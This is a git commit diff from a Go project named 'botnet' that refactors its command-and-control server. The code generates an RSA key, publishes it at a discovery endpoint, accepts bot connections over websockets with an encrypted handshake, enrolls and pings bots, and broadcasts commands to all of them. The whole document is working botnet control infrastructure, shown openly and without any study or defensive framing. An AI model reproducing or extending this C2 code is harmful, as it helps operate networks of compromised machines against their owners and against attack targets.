ea054e327cc76d94b520be4dc03e879364355089
Adriano <adriano.selaviles@gmail.com>
2019-05-24 21:49:21 -0700

    refuct

--- command-and-control/ccserver/cmdctrl.go
+++ command-and-control/ccserver/cmdctrl.go
@@ -2,33 +2,38 @@ package ccserver
 
 import (
 	"crypto/rsa"
+	"encoding/json"
 	"log"
+	"net/http"
 
 	"github.com/adrianosela/botnet/command-and-control/ccworker"
 	"github.com/adrianosela/botnet/lib/encryption"
 	"github.com/adrianosela/botnet/lib/protocol"
+	"github.com/gorilla/websocket"
 )
 
 // CommandAndControl is the command and control - controller
 type CommandAndControl struct {
-	ServerKey     string
 	msgDecryptKey *rsa.PrivateKey
-	recvMsgChan   chan *protocol.Message // Channel for receiving de-crypted messages requests
+	msgEncryptKey string
 	bots          map[string]*ccworker.BotWorker
+	// for inbound decrypted bot messages to be handled one-by-one
+	recvMsgChan chan *protocol.Message
 }
 
-// NewCmdAndCtrl is the constructor for a CommandAndControl
-func NewCmdAndCtrl() (*CommandAndControl, error) {
+// NewCommandAndControl is the constructor for a CommandAndControl
+func NewCommandAndControl() (*CommandAndControl, error) {
+	log.Println("[cmd&ctrl] generating command and control public key...")
 	priv, pub, err := encryption.GenerateRSAKeyPair(8192)
 	if err != nil {
 		return nil, err
 	}
-	log.Printf("[master] public key: \n%s", string(pub))
+	log.Printf("[cmd&ctrl] command and control public key: \n%s", string(pub))
 	return &CommandAndControl{
 		msgDecryptKey: priv,
-		ServerKey:     string(pub),
-		recvMsgChan:   make(chan *protocol.Message),
+		msgEncryptKey: string(pub),
 		bots:          make(map[string]*ccworker.BotWorker),
+		recvMsgChan:   make(chan *protocol.Message),
 	}, nil
 }
 
@@ -46,9 +51,10 @@ func (cc *CommandAndControl) StartBotnet() {
 func (cc *CommandAndControl) EnrolBot(bot *ccworker.BotWorker) {
 	cc.bots[bot.ID] = bot
 	bot.Start()
-	log.Printf("[%s] joined net", bot.ID)
+	log.Printf("[cmd&ctrl] bot %s joined net", bot.ID)
 	// let bot know enrolment succeeded
 	bot.CommandChan <- &protocol.Command{Type: protocol.CommandTypeWelcome}
+	log.Printf("[cmd&ctrl] pinging bot %s...", bot.ID)
 	bot.CommandChan <- &protocol.Command{Type: protocol.CommandTypePing}
 }
 
@@ -58,7 +64,7 @@ func (cc *CommandAndControl) ReleaseBot(id string) {
 		delete(cc.bots, id)
 		close(bot.CommandChan)
 	}
-	log.Printf("[%s] left net", id)
+	log.Printf("[cmd&ctrl] bot %s left net", id)
 }
 
 // HandleBotMessage handles a single given message
@@ -75,7 +81,7 @@ func (cc *CommandAndControl) HandleBotMessage(msg *protocol.Message) {
 
 // BroadcastCommand broadcasts a command to all bots
 func (cc *CommandAndControl) BroadcastCommand(cmd *protocol.Command) {
-	log.Printf("[MASTER] broadcasting message to %d slaves\n", len(cc.bots))
+	log.Printf("[cmd&ctrl] broadcasting command to %d bots\n", len(cc.bots))
 	for botID := range cc.bots {
 		cc.SendCommandToBot(cmd, botID)
 	}
@@ -88,4 +94,43 @@ func (cc *CommandAndControl) SendCommandToBot(cmd *protocol.Command, id string) 
 	default:
 		cc.ReleaseBot(id)
 	}
+}
+
+// KeyHTTPHandler serves the CC server's public key
+func (cc *CommandAndControl) KeyHTTPHandler(w http.ResponseWriter, r *http.Request) {
+	ccDiscoveryBytes, err := json.Marshal(&protocol.CCDiscovery{Key: cc.msgEncryptKey})
+	if err != nil {
+		w.WriteHeader(http.StatusInternalServerError)
+		w.Write([]byte("could not return command and control discovery struct"))
+		return
+	}
+	w.WriteHeader(http.StatusOK)
+	w.Write(ccDiscoveryBytes)
+	return
+}
+
+// CommandAndControlHTTPHandler serves the HTTP entrypoint to the botnet websocket
+func (cc *CommandAndControl) CommandAndControlHTTPHandler(w http.ResponseWriter, r *http.Request) {
+	// upgrade protocol to websockets connection
+	upgrader := websocket.Upgrader{ReadBufferSize: 1024, WriteBufferSize: 1024}
+	conn, err := upgrader.Upgrade(w, r, nil)
+	if err != nil {
+		w.WriteHeader(http.StatusInternalServerError)
+		w.Write([]byte("could not upgrade to WS connection"))
+		return
+	}
+	// receive public key from bot handshake
+	botPubKey, err := protocol.BotHandshake(conn, cc.msgDecryptKey)
+	if err != nil {
+		log.Printf("received join request but failed to complete net handshake: %s", err)
+		return
+	}
+	// create new bot bontroller
+	botController, err := ccworker.NewBotWorker(cc.msgDecryptKey, botPubKey, conn, cc.recvMsgChan)
+	if err != nil {
+		log.Printf("could not create new slave controller for new slave: %s", err)
+		return
+	}
+	// add to net and start socket handlers
+	cc.EnrolBot(botController)
 }
--- command-and-control/ccserver/service.go
+++ command-and-control/ccserver/service.go
@@ -1,70 +1,27 @@
 package ccserver
 
 import (
-	"encoding/json"
-
 	"log"
 	"net/http"
 
-	"github.com/adrianosela/botnet/command-and-control/ccworker"
 	"github.com/adrianosela/botnet/lib/protocol"
 	"github.com/gorilla/mux"
-	"github.com/gorilla/websocket"
 )
 
-// NewCCService returns an HTTP MUX with handler functions
-func NewCCService() *mux.Router {
-	cc, err := NewCmdAndCtrl()
+// NewCommandAndControlService returns a new command and control server
+// wrapped in an http handler
+func NewCommandAndControlService() http.Handler {
+	cc, err := NewCommandAndControl()
 	if err != nil {
 		log.Fatalf("could not create new command and control: %s", err)
 	}
 	go cc.StartBotnet()
 
 	router := mux.NewRouter()
-
 	// exposes a public key for bots to encrypt commands before sending
 	router.Methods(http.MethodGet).Path(protocol.KeyEndpoint).HandlerFunc(cc.KeyHTTPHandler)
 	// accepts new bots and handles all communication to bots
 	router.Methods(http.MethodGet).Path(protocol.CCEndpoint).HandlerFunc(cc.CommandAndControlHTTPHandler)
 
 	return router
-}
-
-// KeyHTTPHandler serves the CC server's public key
-func (cc *CommandAndControl) KeyHTTPHandler(w http.ResponseWriter, r *http.Request) {
-	ccDiscoveryBytes, err := json.Marshal(&protocol.CCDiscovery{Key: cc.ServerKey})
-	if err != nil {
-		w.WriteHeader(http.StatusInternalServerError)
-		w.Write([]byte("could not return command and control discovery struct"))
-		return
-	}
-	w.WriteHeader(http.StatusOK)
-	w.Write(ccDiscoveryBytes)
-	return
-}
-
-// CommandAndControlHTTPHandler serves the HTTP entrypoint to the botnet websocket
-func (cc *CommandAndControl) CommandAndControlHTTPHandler(w http.ResponseWriter, r *http.Request) {
-	// upgrade protocol to websockets connection
-	upgrader := websocket.Upgrader{ReadBufferSize: 1024, WriteBufferSize: 1024}
-	conn, err := upgrader.Upgrade(w, r, nil)
-	if err != nil {
-		w.WriteHeader(http.StatusInternalServerError)
-		w.Write([]byte("could not upgrade to WS connection"))
-		return
-	}
-	// receive public key from bot handshake
-	botPubKey, err := protocol.BotHandshake(conn, cc.msgDecryptKey)
-	if err != nil {
-		log.Printf("received join request but failed to complete net handshake: %s", err)
-		return
-	}
-	// create new bot bontroller
-	botController, err := ccworker.NewBotWorker(cc.msgDecryptKey, botPubKey, conn, cc.recvMsgChan)
-	if err != nil {
-		log.Printf("could not create new slave controller for new slave: %s", err)
-		return
-	}
-	// add to net and start socket handlers
-	cc.EnrolBot(botController)
 }
